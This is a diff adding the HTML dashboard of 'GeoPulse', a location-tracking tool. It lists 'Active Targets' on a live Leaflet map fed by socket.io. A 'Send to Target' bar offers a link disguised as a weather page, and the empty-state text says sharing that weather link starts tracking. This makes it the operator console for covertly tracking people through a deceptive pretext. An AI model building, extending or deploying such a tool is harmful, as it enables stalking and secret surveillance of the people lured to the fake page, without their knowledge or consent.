@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GeoPulse - Dashboard</title>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+
+        :root {
+            --bg-base: #0f0f1a;
+            --bg-header: linear-gradient(90deg, #1a1a2e, #16213e);
+            --bg-card: #1a1a2e;
+            --bg-card-hover: #1e2040;
+            --bg-bar: #13131f;
+            --text-main: #fff;
+            --text-muted: #aaa;
+            --text-muted-dark: #666;
+            --border-color: #ffffff15;
+            --border-card: #ffffff12;
+            --accent: #4ade80;
+            --accent-glow: rgba(74, 222, 128, 0.1);
+        }
+
+        body.light-theme {
+            --bg-base: #f1f5f9;
+            --bg-header: linear-gradient(90deg, #ffffff, #f8fafc);
+            --bg-card: #ffffff;
+            --bg-card-hover: #f8fafc;
+            --bg-bar: #e2e8f0;
+            --text-main: #0f172a;
+            --text-muted: #475569;
+            --text-muted-dark: #334155;
+            --border-color: #cbd5e1;
+            --border-card: #e2e8f0;
+            --accent: #16a34a;
+            --accent-glow: rgba(22, 163, 74, 0.15);
+        }
+
+        body { background: var(--bg-base); color: var(--text-main); display: flex; flex-direction: column; min-height: 100vh; transition: background 0.3s, color 0.3s; }
+
+        header {
+            background: var(--bg-header);
+            padding: 1rem 1.5rem;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid var(--border-color);
+        }
+        header .brand-container { display: flex; align-items: center; gap: 1rem; }
+        header h1 { font-size: 1.5rem; font-weight: 800; letter-spacing: -0.5px; color: var(--text-main); }
+        header h1 span { color: var(--accent); }
+        header a { color: #60a5fa; font-size: 0.82rem; text-decoration: none; }
+        header a:hover { text-decoration: underline; }
+
+        .theme-toggle {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            color: var(--text-main);
+            padding: 0.4rem 0.8rem;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 0.85rem;
+            display: flex;
+            align-items: center;
+            gap: 0.4rem;
+            transition: all 0.2s;
+        }
+        .theme-toggle:hover { background: var(--bg-card-hover); }
+
+        .logout-btn {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            color: var(--text-main);
+            padding: 0.4rem 0.8rem;
+            border-radius: 20px;
+            font-size: 0.85rem;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.4rem;
+            transition: all 0.2s;
+        }
+        .logout-btn:hover {
+            border-color: #ef4444;
+            color: #ef4444;
+        }
+
+        .send-bar {
+            background: var(--bg-bar);
+            padding: 0.5rem 1.5rem;
+            font-size: 0.8rem;
+            color: var(--text-muted-dark);
+            border-bottom: 1px solid var(--border-color);
+        }
+        .send-bar code {
+            background: #dc2626;
+            color: #fff;
+            padding: 0.15rem 0.5rem;
+            border-radius: 4px;
+            font-size: 0.78rem;
+            user-select: all;
+        }
+
+        #overview-map { height: 58vh; width: 100%; border-bottom: 1px solid var(--border-color); }
+
+        .targets-section { padding: 1rem 1.5rem; flex: 1; }
+        .targets-section h2 { font-size: 0.88rem; color: var(--text-muted); margin-bottom: 0.75rem; text-transform: uppercase; letter-spacing: 0.05em; }
+
+        .targets-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(210px, 1fr));
+            gap: 0.6rem;
+        }
+
+        .target-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border-card);
+            border-radius: 10px;
+            padding: 0.75rem 1rem;
+            display: flex;
+            align-items: center;
+            gap: 0.7rem;
+            text-decoration: none;
+            color: var(--text-main);
+            transition: all 0.2s ease;
+        }
+        .target-card:hover {
+            background: var(--bg-card-hover);
+            border-color: var(--accent);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 16px var(--accent-glow);
+        }
+
+        .target-dot {
+            width: 12px; height: 12px;
+            border-radius: 50%;
+            flex-shrink: 0;
+            box-shadow: 0 0 6px currentColor;
+        }
+
+        .target-info .target-id {
+            font-size: 0.85rem;
+            font-weight: 600;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            max-width: 160px;
+        }
+        .target-info .target-live {
+            font-size: 0.65rem;
+            color: var(--accent);
+            margin-top: 2px;
+        }
+
+        .empty-state {
+            text-align: center;
+            padding: 2rem;
+            color: var(--text-muted);
+            font-size: 0.9rem;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="brand-container">
+            <h1>Geo<span>Pulse</span></h1>
+            <a href="https://github.com/Kaifkhan1212" target="_blank">Owned by Kaif Khan</a>
+        </div>
+        <div style="display:flex; align-items:center; gap:0.6rem;">
+            <button class="theme-toggle" id="theme-btn">
+                <span id="theme-icon">☀️</span> Light Mode
+            </button>
+            <a href="/logout" class="logout-btn" title="Log out from GeoPulse">🚪 Logout</a>
+        </div>
+    </header>
+    <div class="send-bar">
+        📲 Send to Target: <code>https://weather.kaifkhan.in/weather</code>
+    </div>
+
+    <!-- Overview map showing ALL tracked users -->
+    <div id="overview-map"></div>
+
+    <div class="targets-section">
+        <h2>📡 Active Targets</h2>
+        <div class="targets-grid" id="targets-grid">
+            {{ for(value, key in TARGETS) }}
+            <a href="/map?id={{ key }}" class="target-card" id="card-{{ key }}">
+                <div class="target-dot" style="background:var(--accent)"></div>
+                <div class="target-info">
+                    <div class="target-id">{{ key }}</div>
+                    <div class="target-live">● Live</div>
+                </div>
+            </a>
+            {{/}}
+        </div>
+        <div class="empty-state" id="empty-msg" style="display:none">
+            No active targets yet. Share the weather link to start tracking.
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/socket.io@4.8.1/client-dist/socket.io.min.js"></script>
+    <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
+    <script>
+        // ── THEME TOGGLE ──────────────────────────────────
+        const themeBtn = document.getElementById('theme-btn');
+        const themeIcon = document.getElementById('theme-icon');
+        
+        // Load preference
+        if (localStorage.getItem('theme') === 'light') {
+            document.body.classList.add('light-theme');
+            themeIcon.textContent = '🌙';
+            themeBtn.innerHTML = '<span id="theme-icon">🌙</span> Dark Mode';
+        }
+
+        themeBtn.addEventListener('click', () => {
+            document.body.classList.toggle('light-theme');
+            const isLight = document.body.classList.contains('light-theme');
+            localStorage.setItem('theme', isLight ? 'light' : 'dark');
+            themeBtn.innerHTML = isLight ? '<span id="theme-icon">🌙</span> Dark Mode' : '<span id="theme-icon">☀️</span> Light Mode';
+        });
+
+        const COLORS = ['#4ade80','#60a5fa','#f59e0b','#f87171','#a78bfa','#34d399','#fb923c','#e879f9']
+
+        // All current target positions passed from server as JSON
+        let targetsData = {};
+        try {
+            const rawJson = `{{ targetsMapJson }}`.replace(/&quot;/g, '"');
+            targetsData = JSON.parse(rawJson);
+        } catch(e) {
+            console.error("Failed to parse targetsMapJson:", e);
+        }
+
+        // ── MAP INIT ──────────────────────────────────────
+        const map = L.map('overview-map');
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { maxZoom: 19 }).addTo(map);
+        setTimeout(() => { map.invalidateSize(); }, 300);
+
+        const markers  = {}
+        const colorMap = {}
+        const bounds   = []
+        let colorIdx   = 0
+
+        function getColor(id) {
+            if (!colorMap[id]) {
+                colorMap[id] = COLORS[colorIdx % COLORS.length]
+                colorIdx++
+            }
+            return colorMap[id]
+        }
+
+        function makeIcon(color) {
+            return L.divIcon({
+                html: `<div style="
+                    background:${color};
+                    width:14px; height:14px;
+                    border-radius:50%;
+                    border:2px solid #fff;
+                    box-shadow:0 0 8px ${color}99">
+                </div>`,
+                className: '',
+                iconSize: [14, 14],
+                iconAnchor: [7, 7]
+            })
+        }
+
+        // Render existing targets
+        for (const [id, pos] of Object.entries(targetsData)) {
+            const [lat, lng] = pos
+            const color = getColor(id)
+
+            markers[id] = L.marker([lat, lng], { icon: makeIcon(color) })
+                .addTo(map)
+                .bindPopup(`<b>${id}</b><br><a href="/map?id=${id}">📍 View full map →</a>`)
+
+            bounds.push([lat, lng])
+
+            // Color the card dot to match map marker
+            const card = document.getElementById(`card-${id}`)
+            if (card) {
+                const dot = card.querySelector('.target-dot')
+                dot.style.background = color
+                dot.style.boxShadow  = `0 0 6px ${color}`
+            }
+        }
+
+        // Fit map to show all targets
+        if (bounds.length === 0) {
+            map.setView([20, 78], 5)   // Default: India
+            document.getElementById('empty-msg').style.display = 'block'
+        } else if (bounds.length === 1) {
+            map.setView(bounds[0], 15)
+        } else {
+            map.fitBounds(bounds, { padding: [50, 50] })
+        }
+
+        // ── SOCKET.IO ─────────────────────────────────────
+        const socket = io("", { secure: true, path: "/socket.io", transports: ['websocket'] })
+
+        // New user connected → add card to list
+        socket.on("user-connected", newId => {
+            if (!colorMap[newId]) {
+                const color = getColor(newId)
+                const grid = document.getElementById('targets-grid')
+                document.getElementById('empty-msg').style.display = 'none'
+
+                const card = document.createElement('a')
+                card.href      = `/map?id=${newId}`
+                card.className = 'target-card'
+                card.id        = `card-${newId}`
+                card.innerHTML = `
+                    <div class="target-dot" style="background:${color};box-shadow:0 0 6px ${color}"></div>
+                    <div class="target-info">
+                        <div class="target-id">${newId}</div>
+                        <div class="target-live">● Live</div>
+                    </div>`
+                grid.appendChild(card)
+            }
+        })
+
+        // Live position update → move marker on overview map
+        socket.on("map-data", ({ id, lat, lng }) => {
+            const color = getColor(id)
+
+            if (markers[id]) {
+                markers[id].setLatLng([lat, lng])
+            } else {
+                markers[id] = L.marker([lat, lng], { icon: makeIcon(color) })
+                    .addTo(map)
+                    .bindPopup(`<b>${id}</b><br><a href="/map?id=${id}">📍 View full map →</a>`)
+            }
+        })
+    </script>
+</body>
+</html>
